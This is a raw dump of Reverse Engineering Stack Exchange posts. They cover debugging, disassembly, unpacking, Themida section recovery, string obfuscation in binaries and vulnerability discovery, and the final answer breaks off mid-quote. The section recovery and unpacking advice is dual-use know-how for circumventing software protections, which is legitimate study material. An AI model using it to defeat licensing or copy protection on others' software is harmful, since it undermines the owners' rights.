","<p><code>cw3220.dll</code> indicates that you're looking at BC++ 5.0. AFAICS the only official documentation regarding the startup code is <a href=""http://pastebin.com/ParJ3683"" rel=""nofollow"">BC5/source/RTL/source/startup/Win32/c0nt.asm</a>, plus <code>_startup.h</code> and <code>startup.c</code> (also somewhere under <code>source/RTL</code>). The struct is defined in <code>_startup.h</code>:
</p>

<pre><code>typedef struct module_data
{
    INIT *init_start;           /* start of a module's _INIT_ segment */
    INIT *init_end;             /* end of a module's _INIT_ segment */
    INIT *exit_start;           /* start of a module's _EXIT_ segment */
    INIT *exit_end;             /* end of a module's _EXIT_ segment */
    int  flags;                 /* flags (see below) */
    int  hmod;                  /* module handle */
    int  (*main)();             /* main/WinMain/_dllmain function */
    int  (*matherr)(void *);    /* (EXE only) _matherr function */
    int  (*matherrl)(void *);   /* (EXE only) _matherrl function */
    long stackbase;             /* (EXE only) base of stack */
    int  *fmode;                /* (EXE only) address of _fmode variable */
} MODULE_DATA;

/* MODULE_DATA flags.
 */
#define MF_WINDOWS  1           /* this is a Windows application */
</code></pre>

<p>If you install from PAKs then it can happen that the RTL sources don't get installed even if you select everything, but the RTL source is present in the BC5 directory on the installation CD (at least in my copy). That documents at least the calling side.</p>

<p>A lot of BC++ 4 internals were documented in the <a href=""https://github.com/mildred/Lysaac/blob/master/doc/boa.cp437.txt"" rel=""nofollow"">Borland Open Architecture Handbook</a> that had to be ordered separately at nominal cost (one floppy). I can't locate the stuff ATM but I've seen copies floating around on the 'net, under the name of <code>bc4boa.zip</code>...</p>
","6902"
"Invalid base64 encoding","625","","<p>I am starring at the following which looks like base64 but not quite:</p>

<pre><code>$ curl -s 'http://cgp.compmed.ucdavis.edu/chapr/education/PATHOBIOLOGY%20OF%20THE%20MOUSE%20TIER%201A/MICROANATOMY/Images/EX02-0006-4.svs?XINFO' | xpath -q -e '//cdata'
&lt;cdata&gt;/9j/2wBDAAoHBwgHBgoICAgLCgoLDhgQDg0NDh0VFhEYIx8lJCIfIiEmKzcvJik0KSEiMEExNDk7Pj4+JS5ESUM8SDc9Pjv/xAAfAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgv/xAC1EAACAQMDAgQDBQUEBAAAAX0BAgMABBEFEiExQQYTUWEHInEUMoGRoQgjQrHBFVLR8CQzYnKCCQoWFxgZGiUmJygpKjQ1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4eLj5OXm5+jp6vHy8/T19vf4+fr/2Q==&lt;/cdata&gt;
&lt;cdata&gt;/9j/2wBDAAUDBAQEAwUEBAQFBQUGBwwIBwcHBw8LCwkMEQ8SEhEPERETFhwXExQaFRERGCEYGh0dHx8fExciJCIeJBweHx7/xAAfAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgv/xAC1EAACAQMDAgQDBQUEBAAAAX0BAgMABBEFEiExQQYTUWEHInEUMoGRoQgjQrHBFVLR8CQzYnKCCQoWFxgZGiUmJygpKjQ1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4eLj5OXm5+jp6vHy8/T19vf4+fr/2Q==&lt;/cdata&gt;
&lt;cdata&gt;/9j/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/xAAfAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgv/xAC1EAACAQMDAgQDBQUEBAAAAX0BAgMABBEFEiExQQYTUWEHInEUMoGRoQgjQrHBFVLR8CQzYnKCCQoWFxgZGiUmJygpKjQ1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4eLj5OXm5+jp6vHy8/T19vf4+fr/2Q==&lt;/cdata&gt;
</code></pre>

<p>However this does not appear to be proper base64 encoded stream:</p>

<pre><code>$ openssl enc -base64 -d &lt;&lt;&lt; /9j/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/xAAfAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgv/xAC1EAACAQMDAgQDBQUEBAAAAX0BAgMABBEFEiExQQYTUWEHInEUMoGRoQgjQrHBFVLR8CQzYnKCCQoWFxgZGiUmJygpKjQ1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4eLj5OXm5+jp6vHy8/T19vf4+fr/2Q==
</code></pre>

<p>openssl returns nothing as if it was invalid base64.</p>

<p>What is the encoding used in this case ?</p>

<p>EDIT:</p>

<p>I was confused by the output. The encoded is actually a valid JPEG header, it does not contains no image, but it contains a valid JPEG Quantization Table (DQT) &amp; Huffman Table(s) (DHT).</p>
","<p>When I looked into the URL, I can see that the base64 encoded data is having newline character.</p>

<p>When you remove newline characters and present that as one single line to openssl,  you need the <strong><em>-A</em></strong> option.</p>

<p>The below will work fine.</p>

<pre><code>$openssl enc -A -d -base64 &lt;&lt;&lt; /9j/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/xAAfAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgv/xAC1EAACAQMDAgQDBQUEBAAAAX0BAgMABBEFEiExQQYTUWEHInEUMoGRoQgjQrHBFVLR8CQzYnKCCQoWFxgZGiUmJygpKjQ1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4eLj5OXm5+jp6vHy8/T19vf4+fr/2Q==
</code></pre>

<p>Or you can also use still a simple method as below</p>

<pre><code>$ echo ""/9j/2wBDAAoHBwgHBgoICAgLCgoLDhgQDg0NDh0VFhEYIx8lJCIfIiEmKzcvJik0KSEiMEExNDk7Pj4+JS5ESUM8SDc9Pjv/xAAfAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgv/xAC1EAACAQMDAgQDBQUEBAAAAX0BAgMABBEFEiExQQYTUWEHInEUMoGRoQgjQrHBFVLR8CQzYnKCCQoWFxgZGiUmJygpKjQ1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4eLj5OXm5+jp6vHy8/T19vf4+fr/2Q=="" | base64 --decode
</code></pre>

<p>We can also do this with notepad++ using <a href=""http://download.tuxfamily.org/nppplugins/MimeTools/mimeTools.v1.7.zip"" rel=""nofollow"">MIME tools plugin</a>.</p>

<p>This proves this is base64 encoded data.</p>
","3022"
"Importing external libraries in Hopper scripts?","624","","<p>Can external libraries be used in Hopper scripts? I'd like to add PDB support to <a href=""http://www.hopperapp.com/"">Hopper</a> using <a href=""https://code.google.com/p/pdbparse/"">pdbparse</a>, but I haven't been able to get it to use external libraries.</p>

<p>Alternatively, I suppose one could just dump the debug symbol offsets to a text file and read that, but it seems like a clunkier solution (since you wouldn't be able to, e.g., auto-download symbols from the MS Symbol Server).</p>
","<p>At the moment, there is no way to debug a dylib. I know that it is a real problem, and I plan to add such a feature in a future update.</p>

<p>Another thing that will be added to Hopper is the ability to load multiple file in the same document, in order to disassemble things like kext for instance.</p>
","1368"
"Protect data stored in binary","624","","<p>Let's say I've some function(i.e. hash function), that generates value from input seed and some precomputed hash values, that are stored somewhere in binary. What are the possible approaches for:</p>

<ol>
<li>Protect string data against dumping</li>
<li>Protect hash algorithm from being reverse engineered for a while</li>
</ol>

<p>I understand that the goal of complete algorithm concealment from reverser is impossible but what technique will raise the efforts to do this?</p>

<p>My thoughts on this topic:</p>

<ol>
<li>Protect hash strings with <a href=""http://www.sevagas.com/?String-encryption-using-macro-and"" rel=""nofollow"">encryption macro</a></li>
<li>Obfuscating target function using some king of obfuscation/poly/metamorphic engine in order to prevent easy algorithm recovery(can lead to AV false positive but should not harm in general)</li>
<li>Roughly generate new  hash function and values for each copy of program(kind of hard to implement and maintain)</li>
</ol>

<p>Maybe anybody have better concepts that will suit my goal and be so kind to post it here.</p>

<p>P.S. please do not advice to use packers/protectors. False positive AV does not cost couple functions algorithm concealment.</p>

<p><strong>UPD</strong></p>

<p><a href=""https://mega.co.nz/#!3VxkFaLQ!3Vs8Tl6nf_9cssH-Xe8yYuaST3r1E_E13n6Af9jW2l8"" rel=""nofollow"">Here</a> is the implementation if string protection written in C++. I don't know if this solution be useful for other people but it's worth mentioning though. </p>
","<p>I would start with not have critical strings in memory in linear manner</p>

<ul>
<li>rather each character can be offseted by some offset</li>
<li>by table mixing all the strings together</li>
<li>For example you got <code>0123456789</code></li>
<li>if you store them in memory like this:</li>
<li><code>|0x1xx2xxx3xxxx4|</code></li>
<li><code>|xxxxx5xxxxxx6xx|</code></li>
<li><code>|xxxx7xxxxxxxx8x|</code></li>
<li><code>|xxxxxxxx9xxxxxx|</code> where x is anything or another string ...</li>
<li>it is pretty hard to get the meaning</li>
</ul>

<p>Next level is even better</p>

<pre><code>//---------------------------------------------------------------------------
const int N=16384;
char txt[N];    // my texts
int  ofs[N];    // randomized offsets
//---------------------------------------------------------------------------
void ofs_init()                 // randomize offsets
    {
    int i,j,a;
    for (i=0;i&lt;N;i++) ofs[i]=i;
    for (i=0;i&lt;N;i++) { j=Random(N); a=ofs[i]; ofs[i]=ofs[j]; ofs[j]=a; }
    }
//---------------------------------------------------------------------------
void ofs_write(int adr,char a) // linear to ofset encoding
    {
    txt[ofs[adr]]=a;
    }
//---------------------------------------------------------------------------
char ofs_read(int adr) // linear to ofset decoding
    {
    return txt[ofs[adr]];
    }
//---------------------------------------------------------------------------
</code></pre>

<ul>
<li>so create offset table on runtime</li>
<li>which will randomly map linear string offsets to nonlinear offsets</li>
<li>this is very hard to decode because it mixes all strings together (and if they are hashes) then without stepping is almost impossible to decode this (not knowing what it does of coarse)</li>
</ul>

<p>Here an example of how to use it and how output looks:</p>

<pre><code>// [encode] + save to file for output comparison
// AnsiString s holds oll my texts (an image in this case)
Randomize();
ofs_init();
for (i=0;i&lt;s.Length();i++) ofs_write(i,s[i+1]);
i=FileCreate(""picenc.txt""); FileWrite(i,txt,N); FileClose(i);
// [decode] you should not decode critical strings to memory rather decode each char only when needed instead
// I decode the whole thing to save to file for output comparison
for (i=0;i&lt;s.Length();i++) s[i+1]=ofs_read(i);
i=FileCreate(""picdec.txt""); FileWrite(i,s.c_str(),s.Length()); FileClose(i);
</code></pre>

<p>And the results are like this:</p>

<ul>
<li><img src=""https://i.stack.imgur.com/2dOxN.png"" alt=""output""></li>
<li>on the left is decoded text <code>picdec.txt</code></li>
<li>on right is encoded text <code>picenc.txt</code> this is how the srings looks in memory</li>
</ul>

<p>On top of this you can add any kind of encryption (not only to text itself but to offset table also ...)</p>
","8807"
"Setting Breakpoints at functions decoded by Hopper/IDA Pro in an iOS app","624","","<p>So, its been very interesting to reverse engineer an iOS application and I have made significant improvement into learning how to read disassembly and understand them. Now I was trying to debug the iOS app using lldb debugserver.</p>

<p>I was able to attach my system to my jailbroken ipad running the gdb server and hooked it to one of the running process. Now the problem is, that the executable has no symbols (or at least lldb is telling me that). But when I tried to disassemble it in IDA Pro and Hopper, I was able to get all the objective-c classes and functions names. </p>

<p>For example, one of the function that is being used is HMACWithSecret which has the signature -[NSString(HMAC) HMACWithSecret:]</p>

<p>If I try to set a break point from lldb using the command</p>

<pre><code>b -[NSString(HMAC) HMACWithString:]
</code></pre>

<p>Or any other variant</p>

<pre><code>b HMACWithSecret:
b HMACWithSecret
</code></pre>

<p>It fails to find a location for the same. I know that in objective-c every call is made via objc_msgSend with arguments about which function to call. But if i want to set a breakpoint in the above function (or any other I reveal via Hopper/IDA Pro) what should I do? </p>
","<p>I was able to achieve this by installing gdbserver on my ipad. Then i ssh into the ipad and attach a remote lldb debugger (xcode tools) to attack breakpoints. A long method but works. There are now tools to debug in same way on android and ios. </p>
","12262"
"Best and smarter way to improve unpacking skills","623","","<p>I want to find a way to improve my unpacking skills, i am not a noob but i miss steps from simple to hard packers.</p>

<p>I saw lot of video tutorials, the most of the time i see ""click F9 x times to reach the OEP"" or ""ESP trick"" without go deeper as i want. 
I find the learning process slow in this way.</p>

<p>I am searching for paper or books to go deeper in this art, my goal is to be able to face malware analisis in the best way.</p>

<p>Please advice, thanks</p>
","<p>There is not a single paper or book that explains the art of unpacking. This is mainly due to all the different packers that require different techniques to unpack them. There are of course generic approaches that work on some packers but knowing when to use them is gained from experience. IMHO the best approach to learn unpacking is to follow along with unpackmes in a debugger. My favorite unpacking author is <a href=""http://www.reversing.be/search.php?query=&amp;keyType=phrase&amp;datestart=&amp;dateend=&amp;topic=0&amp;type=all&amp;author=63&amp;mode=search"">Haggar</a>. Once you go through a handful of the tutorials you will observe patterns of instructions and API sequences. Once you see those patterns you should try to unpack the sample using what you previously learned. If you fail, you can continue on with the tutorial and if you succeed, you can move on to the next tutorial. Either way you learn something new or apply previously gained knowledge. In the long run it will help you with unpacking malware. </p>
","8694"
"Recovering original PE sections after Themida merges them","623","","<p>Visual C++ produces binaries with <code>.code</code>, <code>.rdata</code>, and <code>.data</code> sections (in that order). Themida merges all three into a nameless section, which is detrimental to analysis. In particular, I want to run the <a href=""http://www.openrce.org/downloads/details/253/IDA_Extra_Pass"" rel=""nofollow"">Extra Pass</a> plugin for IDA on a dump from memory of a Themida'd executable (imports not recovered), but it needs the real bounds of the .code section or it will aggressively convert a lot of actual data into code.</p>

<p>How could I go about recovering the base of the <code>.rdata</code> and <code>.data</code> sections?</p>
","<p>Basically the best way to start doing this is to compile your own EXE (with the same compiler as the Themida protected file when possible) and try to merge the sections by yourself. I crafted an example for you (source code: <a href=""http://codepad.org/RqNiH3Ly"" rel=""nofollow"">http://codepad.org/RqNiH3Ly</a>, download RAR (merged + directly compiled): <a href=""https://mega.co.nz/#!aoAUALBJ!6riSM4VmT43Ywf_jxQAY73EsVXyjEAAhJ1rOSGaYdeI"" rel=""nofollow"">https://mega.co.nz/#!aoAUALBJ!6riSM4VmT43Ywf_jxQAY73EsVXyjEAAhJ1rOSGaYdeI</a>, just some executable I was working with at the moment, compiled with VS10).</p>

<p>The base of the .data section can basically be found by searching for references to every address aligned to 0x1000 in the code (VS10 uses data pointers in order, so just scroll up to the base of the first section and look for a pointer). For example:</p>

<blockquote>
  <p>01251000  /$  81EC 0C010000 SUB ESP,10C<br>
  01251006  |.  A1 00302501   MOV EAX,DWORD PTR DS:[1253000] ; pointer to .data<br>
  0125100B  |.  33C4          XOR EAX,ESP</p>
</blockquote>

<p>In my case (the EXE also has relocations) the ImageBase was 0x1250000, so the RVA of the .data section would be 0x1253000 - 0x1250000 = 0x3000</p>

<p>The .rdata section is just the RVA aligned up to 0x1000 from the actual end of the code (you can learn this from the original file). In this case:</p>

<blockquote>
  <p>012518E2   $- FF25 60202501 JMP DWORD PTR DS:[&lt;&amp;MSVCR100._except_han><br>
  012518E8   $- FF25 64202501 JMP DWORD PTR DS:[&lt;&amp;MSVCR100._invoke_wat><br>
  012518EE   $- FF25 68202501 JMP DWORD PTR DS:[&lt;&amp;MSVCR100.<em>controlfp</em>> ; end<br>
  012518F4      00            DB 00<br>
  012518F5      00            DB 00</p>
</blockquote>

<p>0x12518EE - 0x1250000 = 0x18EE, rounded up 0x2000, so the original RVA of the .rdata section is 0x2000.</p>

<p>Similar calculations can be done for the .reloc section (search for the binary mask ""3? 3? 3? 3? 3?"" will get you pretty close on x86).</p>

<p>Just learn to know the compiler structure and use it to recover something similar to the original (maybe Themida just appends the raw section data and changes all data pointers etc). Hope this helps a little :)</p>
","4333"
"Windows debugger with ltrace functionality","623","","<p>I recently found the program: ltrace. And was wondering if it's possible to achieve the same using one of the gui debuggers for windows: ida, immunity,  etc. The only thing I've found is a port of the cmdline util. Which is perfectly fine, but it would be convenient if I could do the same using, say ida.</p>

<p>Tldr; Trace library calls using a windows debugger/disassembler.</p>

<p>Thanks for the quick response and the examples. Got everything I needed.</p>
","<p>ollydbg -> search for all intermodular calls -> in the new window -> set log break point radio button pause to never , log function argument to always ok </p>

<p>you should see all the lib functions breakpointed in pink </p>

<p>f9 to run the application </p>

<p>on exit look at log window for all the calls that were made to other modules from executab;e</p>

<pre><code>Log data
Message
Program entry point
CALL to GetSystemTimeAsFileTime
  pFileTime = 0013FFB4
CALL to GetCurrentProcessId
CALL to GetCurrentThreadId
CALL to GetTickCount
CALL to QueryPerformanceCounter
  pPerformanceCount = 0013FFAC
CALL to HeapCreate
  Flags = 0
  InitialSize = 1000 (4096.)
  MaximumSize = 0
CALL to GetModuleHandleW
  pModule = ""KERNEL32.DLL""
CALL to GetProcAddress
  hModule = 7C800000 (kernel32)
  ProcNameOrOrdinal = ""FlsAlloc""
CALL to GetProcAddress
  hModule = 7C800000 (kernel32)
  ProcNameOrOrdinal = ""FlsGetValue""
CALL to GetProcAddress
  hModule = 7C800000 (kernel32)
  ProcNameOrOrdinal = ""FlsSetValue""
CALL to GetProcAddress
  hModule = 7C800000 (kernel32)
  ProcNameOrOrdinal = ""FlsFree""
CALL to TlsAlloc
CALL to TlsSetValue
  TlsIndex = 1
  pValue = kernel32.TlsGetValue
CALL to TlsAlloc
CALL to HeapAlloc
  hHeap = 00350000
  Flags = HEAP_ZERO_MEMORY
</code></pre>

<p>windbg </p>

<p><strong>cdb -c ""!logexts.loge;!logm i *;!loge;!logo e d;g;q"" msgboxw.exe > trace.txt &amp; grep MessageBoxW trace.txt</strong></p>

<pre><code>Thrd 3c4 00401017 MessageBoxW( NULL ""cannot find ""hello"""" ""test""MB_OK) -&gt; IDOK
Thrd 3c4 0040102B MessageBoxW( NULL ""cannot find ""iello"""" ""test""MB_OK) -&gt; IDOK
Thrd 3c4 0040103F MessageBoxW( NULL ""cannot find ""jello"""" ""test""MB_OK) -&gt; IDOK
Thrd 3c4 00401053 MessageBoxW( NULL ""cannot find ""fello"""" ""test""MB_OK) -&gt; IDOK
Thrd 3c4 00401067 MessageBoxW( NULL ""cannot find ""kello"""" ""test""MB_OK) -&gt; IDOK
Thrd 3c4 0040107B MessageBoxW( NULL ""saying ""hello"" baby"" ""test""MB_OK) -&gt; IDOK
</code></pre>
","8645"
"Adding Backlink for XREF in IDA","618","","<p>I have an indirect call to a function. I traced the program and added the target to the xref, so this works fine. The problem is though, that on the position where the call is, there is no link shown. I thought, that, when I add an XREF, both positions are shown, because this is also the behaviour with the other referenzes, IDA automatically finds out.</p>

<p>To illustrate what I mean:</p>

<p>The call is here without showing me where it points to:</p>

<pre><code>CODE:004A3F07 00C                 call    dword ptr [edx+28h]
</code></pre>

<p>The xref I added is here showing the link:</p>

<pre><code>CODE:004A3390     DecryptMemory proc near            ; CODE XREF: sub_4A3EC0:loc_4A3F07 P
</code></pre>

<p>Is it possible to make IDA show the reference on both addresses? I know I can create a manual xref there as well, but then IDA creates a label as well, which makes it a bit confusing, when revisting. I tried to remove the label, but this doesn't work either (would this be possible?).</p>
","<p>IDA does not automatically show the xref existence at the source as you are claiming. In most cases it's not necessary, as the destination is usually printed as part of the instruction or data item.</p>

<p>However, for resolved indirect calls the <em>processor module</em> may display a comment to help the user. For some processors (including x86) you can use the ""Change callee address"" plugin (<kbd>Alt+F11</kbd>) to manually set the destination of an indirect call. It adds both an xref and makes the processor module print an auto-comment.</p>
","2932"
"Understanding gdb output","618","","<p>So I was messing with gdb and came across something rather interesting. I ran the following code into gdb:</p>

<pre><code>int i, g = 1;
for (i = 0; i &lt; 100; i++)
          g++;
</code></pre>

<p>Before execution, <strong>disas main</strong> yields:</p>

<pre><code>   0x000000000000064a &lt;+0&gt;: push   %rbp
   0x000000000000064b &lt;+1&gt;: mov    %rsp,%rbp
   0x000000000000064e &lt;+4&gt;: sub    $0x10,%rsp
   0x0000000000000652 &lt;+8&gt;: movl   $0x1,-0x4(%rbp)
   0x0000000000000659 &lt;+15&gt;:    movl   $0x0,-0x8(%rbp)
   0x0000000000000660 &lt;+22&gt;:    jmp    0x66a &lt;main+32&gt;
   0x0000000000000662 &lt;+24&gt;:    addl   $0x1,-0x4(%rbp)
   0x0000000000000666 &lt;+28&gt;:    addl   $0x1,-0x8(%rbp)
   0x000000000000066a &lt;+32&gt;:    cmpl   $0x63,-0x8(%rbp)
   0x000000000000066e &lt;+36&gt;:    jle    0x662 &lt;main+24&gt;
   0x0000000000000670 &lt;+38&gt;:    mov    -0x4(%rbp),%eax
   ...
</code></pre>

<p>Interestingly, after <strong>run</strong>, things look different:</p>

<pre><code>   0x000055555555464a &lt;+0&gt;: push   %rbp
   0x000055555555464b &lt;+1&gt;: mov    %rsp,%rbp
   0x000055555555464e &lt;+4&gt;: sub    $0x10,%rsp
   0x0000555555554652 &lt;+8&gt;: movl   $0x1,-0x4(%rbp)
   0x0000555555554659 &lt;+15&gt;:    movl   $0x0,-0x8(%rbp)
   0x0000555555554660 &lt;+22&gt;:    jmp    0x55555555466a &lt;main+32&gt;
   0x0000555555554662 &lt;+24&gt;:    addl   $0x1,-0x4(%rbp)
   0x0000555555554666 &lt;+28&gt;:    addl   $0x1,-0x8(%rbp)
   0x000055555555466a &lt;+32&gt;:    cmpl   $0x63,-0x8(%rbp)
   0x000055555555466e &lt;+36&gt;:    jle    0x555555554662 &lt;main+24&gt;
   0x0000555555554670 &lt;+38&gt;:    mov    -0x4(%rbp),%eax
   ...
</code></pre>

<p>What is going on here? Why the addresses are different before execution?</p>

<p>Edit:</p>

<p>Output of <strong>info proc mappings</strong>:</p>

<pre><code>      Start Addr           End Addr       Size     Offset objfile
  0x555555554000     0x555555555000     0x1000        0x0 /tmp/test
  0x555555754000     0x555555755000     0x1000        0x0 /tmp/test
  0x555555755000     0x555555756000     0x1000     0x1000 /tmp/test
  0x7ffff7a21000     0x7ffff7bcf000   0x1ae000        0x0 /usr/lib/libc-2.26.so
  0x7ffff7bcf000     0x7ffff7dce000   0x1ff000   0x1ae000 /usr/lib/libc-2.26.so
  0x7ffff7dce000     0x7ffff7dd2000     0x4000   0x1ad000 /usr/lib/libc-2.26.so
  0x7ffff7dd2000     0x7ffff7dd4000     0x2000   0x1b1000 /usr/lib/libc-2.26.so
  0x7ffff7dd4000     0x7ffff7dd8000     0x4000        0x0 
  0x7ffff7dd8000     0x7ffff7dfd000    0x25000        0x0 /usr/lib/ld-2.26.so
  0x7ffff7fcc000     0x7ffff7fce000     0x2000        0x0 
  0x7ffff7ff7000     0x7ffff7ffa000     0x3000        0x0 [vvar]
  0x7ffff7ffa000     0x7ffff7ffc000     0x2000        0x0 [vdso]
  0x7ffff7ffc000     0x7ffff7ffd000     0x1000    0x24000 /usr/lib/ld-2.26.so
  0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x25000 /usr/lib/ld-2.26.so
  0x7ffff7ffe000     0x7ffff7fff000     0x1000        0x0 
  0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
  0xffffffffff600000 0xffffffffff601000     0x1000        0x0 [vsyscall]
</code></pre>

<p><strong>maint info section</strong>:</p>

<pre><code>file type elf64-x86-64.
 [0]     0x00000238-&gt;0x00000254 at 0x00000238: .interp ALLOC LOAD READONLY DATA HAS_CONTENTS
 [1]     0x00000254-&gt;0x00000274 at 0x00000254: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS
 [2]     0x00000274-&gt;0x00000298 at 0x00000274: .note.gnu.build-id ALLOC LOAD READONLY DATA HAS_CONTENTS
 [3]     0x00000298-&gt;0x000002b4 at 0x00000298: .gnu.hash ALLOC LOAD READONLY DATA HAS_CONTENTS
 [4]     0x000002b8-&gt;0x00000360 at 0x000002b8: .dynsym ALLOC LOAD READONLY DATA HAS_CONTENTS
 [5]     0x00000360-&gt;0x000003e4 at 0x00000360: .dynstr ALLOC LOAD READONLY DATA HAS_CONTENTS
 [6]     0x000003e4-&gt;0x000003f2 at 0x000003e4: .gnu.version ALLOC LOAD READONLY DATA HAS_CONTENTS
 [7]     0x000003f8-&gt;0x00000418 at 0x000003f8: .gnu.version_r ALLOC LOAD READONLY DATA HAS_CONTENTS
 [8]     0x00000418-&gt;0x000004f0 at 0x00000418: .rela.dyn ALLOC LOAD READONLY DATA HAS_CONTENTS
 [9]     0x000004f0-&gt;0x00000508 at 0x000004f0: .rela.plt ALLOC LOAD READONLY DATA HAS_CONTENTS
 [10]     0x00000508-&gt;0x0000051f at 0x00000508: .init ALLOC LOAD READONLY CODE HAS_CONTENTS
 [11]     0x00000520-&gt;0x00000540 at 0x00000520: .plt ALLOC LOAD READONLY CODE HAS_CONTENTS
 [12]     0x00000540-&gt;0x00000702 at 0x00000540: .text ALLOC LOAD READONLY CODE HAS_CONTENTS
 [13]     0x00000704-&gt;0x0000070d at 0x00000704: .fini ALLOC LOAD READONLY CODE HAS_CONTENTS
 [14]     0x00000710-&gt;0x00000718 at 0x00000710: .rodata ALLOC LOAD READONLY DATA HAS_CONTENTS
 [15]     0x00000718-&gt;0x0000074c at 0x00000718: .eh_frame_hdr ALLOC LOAD READONLY DATA HAS_CONTENTS
 [16]     0x00000750-&gt;0x00000840 at 0x00000750: .eh_frame ALLOC LOAD READONLY DATA HAS_CONTENTS
 [17]     0x00200de0-&gt;0x00200de8 at 0x00000de0: .init_array ALLOC LOAD DATA HAS_CONTENTS
 [18]     0x00200de8-&gt;0x00200df0 at 0x00000de8: .fini_array ALLOC LOAD DATA HAS_CONTENTS
 [19]     0x00200df0-&gt;0x00200fd0 at 0x00000df0: .dynamic ALLOC LOAD DATA HAS_CONTENTS
 [20]     0x00200fd0-&gt;0x00201000 at 0x00000fd0: .got ALLOC LOAD DATA HAS_CONTENTS
 [21]     0x00201000-&gt;0x00201020 at 0x00001000: .got.plt ALLOC LOAD DATA HAS_CONTENTS
 [22]     0x00201020-&gt;0x00201030 at 0x00001020: .data ALLOC LOAD DATA HAS_CONTENTS
 [23]     0x00201030-&gt;0x00201038 at 0x00001030: .bss ALLOC
 [24]     0x00000000-&gt;0x00000011 at 0x00001030: .comment READONLY HAS_CONTENTS
</code></pre>
","<p>Seems like <em><a href=""https://en.wikipedia.org/wiki/Relocation_(computing)"" rel=""nofollow noreferrer"">relocation</a></em>. If you look at the addresses in your first listing, you will notice that these addresses are unusually low. That's probably because gdb displays file offsets there (although I have no idea why that is the case for you).</p>

<p>When you run the file, the loader kicks in and maps the sections to the virtual address space of the program, and thats where the <code>0x0000555555554000</code> section offset comes from. </p>

<p>You can see the file offsets of each section using <code>maint info sections</code>. You can get information about the actual mapped memory sections using <code>info proc mappings</code> at runtime.</p>

<p><strong>edit:</strong></p>

<p>Based on the output of the commands above, everything seems to be alright.</p>

<pre><code>[12]     0x00000540-&gt;0x00000702 at 0x00000540: .text ALLOC LOAD READONLY CODE HAS_CONTENTS
</code></pre>

<p>This line states that the <code>.text</code> section of your code starts at file offset 0x540 and ends at 0x702 containing code. If your compare it with your first disassembly starting at offset 0x64a, this is a decent fit.</p>

<pre><code>0x555555554000     0x555555555000     0x1000        0x0 /tmp/test
</code></pre>

<p>This line states that the executable itself was mapped to the base address <code>0x555555554000</code>. Given the offset from before, that means your main function should be at <code>0x555555554000 + 0x64a</code>. Your second disassembly confirms that.</p>
","16522"
"Disassembling an MS-DOS EXE","617","","<p>I've been disassembling an MS-DOS EXE and I've been using this link <a href=""http://www.delorie.com/djgpp/doc/exe/"" rel=""nofollow noreferrer"">http://www.delorie.com/djgpp/doc/exe/</a> to make heads and tails of the binary.</p>

<p>The header seems to be an older version compared to the headers that precede the PE segment found in today's modern Windows executables.</p>

<p>I've been using nasm's (Disassembler), but the program is not as complex as IDA Pro. Finding it hard to find main function entry point, especially with the disassembler engine working on an offset based logic to determine the decoding per instruction and due to the nature I'm also not familiar with the standard.</p>

<p>I'm assuming the IP field in the MS-DOS could be the main function entry point of the executable and was hoping someone or somebody could confirm my speculations.</p>
","<p>The entry point is calculated like this:</p>

<pre><code>((header_paragraphs + cs) &lt;&lt; 4) + ip
</code></pre>

<p>I wrote a MZ exe disassembler time ago, take a <a href=""https://github.com/Nico01/ded"" rel=""nofollow noreferrer"">look</a>.</p>
","14554"
"How are vulnerabilities (especially buffer overruns) found in the wild?","615","","<p>I hope this question is not OT for RE, but I'm rather curious as to how vulnerabilities are usually found.</p>

<p>Of course I'm aware that companies are doing code audits to identify security problems but I doubt that the results of such audits are publicly made available. Another way to find potential attacks is of course thinking about the details of a particular technique and finding its weakness (a timing attack would probably qualify as such).</p>

<p>However, in the case of buffer overruns, I'm always wondering how people find out about it. I mean, if there is a release of some software, reversing it and hoping to find a buffer overflow this way seems rather hopeless to me, considering how much work this is. If your software crashes because of some special input, then of course this can be analyzed and might result in a security vulnerability. So are malware author just monitoring various sources (bug reporting site or similar) in the hope of hearing about such cases to look into it? Somehow I can't believe it.</p>
","<p>Most vulnerabilities in closed-source products are found via fuzzing and static reverse engineering.</p>

<blockquote>
  <p>reversing it and hoping to find a buffer overflow this way seems
  rather hopeless to me, considering how much work this is</p>
